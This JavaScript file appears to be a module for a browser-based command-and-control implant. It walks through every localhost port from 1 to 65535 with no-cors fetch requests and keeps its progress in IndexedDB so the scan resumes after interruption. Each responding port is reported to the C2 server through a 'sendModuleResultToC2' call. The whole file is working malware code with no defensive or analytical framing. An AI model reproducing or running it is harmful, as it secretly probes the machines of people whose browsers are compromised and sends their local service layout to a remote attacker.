function localhostPortScanIncreaseAndScan(){
  localPortScanPort = localPortScanPort + 1;
  if(localPortScanPort > 65535){
    deregisterModule('localhost_port_scan');
    sendModuleResultToC2('localhost_port_scan', `| COMPLETED`);
    return; // no more
  }
  WriteIDB("localhost_port_scan", localPortScanPort);
  doLocalhostPortScan();
}

function doLocalhostPortScan(){
  fetch("http://127.0.0.1:" + localPortScanPort, {mode: 'no-cors'})
  .then(function(res){
    sendModuleResultToC2('localhost_port_scan', `| ${localPortScanPort} `);
    localhostPortScanIncreaseAndScan();
  })
  .catch(function(ex){
    localhostPortScanIncreaseAndScan();
  });
}

var localPortScanPort;

// wakes up the DB
WriteIDB("localhost_port_scan_init", 1);
// save module in list of extra_modules
registerModule('localhost_port_scan');
// check what last port scanned and resume
new Promise((res, rej) => {
  ReadIDB("localhost_port_scan", rej);
}).catch(function(p){
  if(p == undefined){
    localPortScanPort = 1;
  }else{
    localPortScanPort = p;
  }
  doLocalhostPortScan();
});
